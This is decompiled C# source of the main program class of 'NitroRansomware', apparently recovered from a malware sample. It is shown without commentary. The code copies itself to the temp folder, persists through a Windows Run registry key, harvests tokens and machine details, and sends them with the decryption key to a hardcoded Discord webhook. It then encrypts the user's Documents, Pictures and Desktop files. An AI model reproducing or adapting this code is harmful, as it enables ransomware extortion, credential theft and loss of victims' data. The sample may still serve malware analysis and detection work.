// Decompiled with JetBrains decompiler
// Type: NitroRansomware.Program
// Assembly: NitroRansomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 884F7023-5B8E-423B-BD61-5C84B42B2DFE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Gen.gen-92190c9789485a0d96bced7040080f0ae35c02898c3d31a65d50ecd659b80f09.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace NitroRansomware
{
  internal class Program
  {
    private static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    private static string documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    private static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
    public static string WEBHOOK = "https://canary.discord.com/api/webhooks/832337573137481738/CLEu4D_JA7ZHqWw480anTMj55DiipiCfvTOZKWyxtYoOBT5NqVUqxnWgq_wsjiGO4IoT";
    public static string DECRYPT_PASSWORD = "ZGVmYXVsdHBhc3N3b3Jk";
    private static Logs logging = new Logs("DEBUG", 0);
    private static Webhook ww = new Webhook(Program.WEBHOOK);

    private static void Main(string[] args)
    {
      if (Program.Installed())
      {
        Application.Run((Form) new Form1());
      }
      else
      {
        Program.Duplicate();
        Program.StartUp();
        Program.Setup();
        Program.EncryptAll();
        Program.Temp();
        Thread.Sleep(6000);
        Application.Run((Form) new Form1());
      }
    }

    private static void Setup()
    {
      Program.logging.Debug("Setup start");
      List<string> stringList = Grabber.Grab();
      string str1 = "";
      foreach (string str2 in stringList)
        str1 = str1 + str2 + "\n";
      Console.WriteLine(str1);
      List<string> details = User.GetDetails();
      string identifier = User.GetIdentifier();
      string ip = User.GetIP();
      Webhook webhook = new Webhook(Program.WEBHOOK);
      webhook.Send("**Program executed** ```Status: Active \nPC Name: " + details[0] + "\nUser:" + details[1] + "\nUUID: " + identifier + "\nIP Address: " + ip + "```");
      webhook.Send("```Decryption Key: " + Program.DECRYPT_PASSWORD + "```");
      webhook.Send("```Tokens:\n" + str1 + "```");
    }

    public static void EncryptAll()
    {
      Program.ww.Send("```Starting file encryption..```");
      Thread thread1 = new Thread((ThreadStart) (() => Crypto.EncryptContent(Program.documents)));
      Thread thread2 = new Thread((ThreadStart) (() => Crypto.EncryptContent(Program.pictures)));
      Thread thread3 = new Thread((ThreadStart) (() => Crypto.EncryptContent(Program.desktop)));
      thread1.Start();
      thread2.Start();
      thread3.Start();
      thread1.Join();
      thread2.Join();
      thread3.Join();
      Program.ww.Send(string.Format("```Finished encrypting victim's files. Total number of files encrypted: {0}```", (object) Crypto.encryptedFileLog.Count));
      Wallpaper.ChangeWallpaper();
    }

    public static void DecryptAll()
    {
      Thread thread1 = new Thread((ThreadStart) (() => Crypto.DecryptContent(Program.documents)));
      Thread thread2 = new Thread((ThreadStart) (() => Crypto.DecryptContent(Program.pictures)));
      Thread thread3 = new Thread((ThreadStart) (() => Crypto.DecryptContent(Program.desktop)));
      thread1.Start();
      thread2.Start();
      thread3.Start();
      thread1.Join();
      thread2.Join();
      thread3.Join();
    }

    private static void StartUp()
    {
      try
      {
        string str1 = Process.GetCurrentProcess().ProcessName + ".exe";
        string str2 = Path.GetTempPath() + str1;
        Console.WriteLine(str2);
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
          registryKey.SetValue("NR", (object) ("\"" + str2 + "\""));
      }
      catch (Exception ex)
      {
        Program.logging.Error(ex.Message);
      }
    }

    public static void RemoveStart()
    {
      if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", (object) true) == null)
        return;
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
        registryKey.DeleteValue("NR", false);
    }

    private static void Duplicate()
    {
      try
      {
        string path2 = Process.GetCurrentProcess().ProcessName + ".exe";
        File.Copy(Path.Combine(Environment.CurrentDirectory, path2), Path.GetTempPath() + path2);
        Console.WriteLine(Path.GetTempPath());
      }
      catch (Exception ex)
      {
        Program.logging.Debug(ex.Message);
      }
    }

    private static bool Installed() => Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", (object) null) != null;

    private static void Temp()
    {
      string path = Path.GetTempPath() + "NR_decrypt.txt";
      Console.WriteLine(path);
      using (StreamWriter streamWriter = new StreamWriter(path))
        streamWriter.WriteLine(Program.DECRYPT_PASSWORD);
    }
  }
}
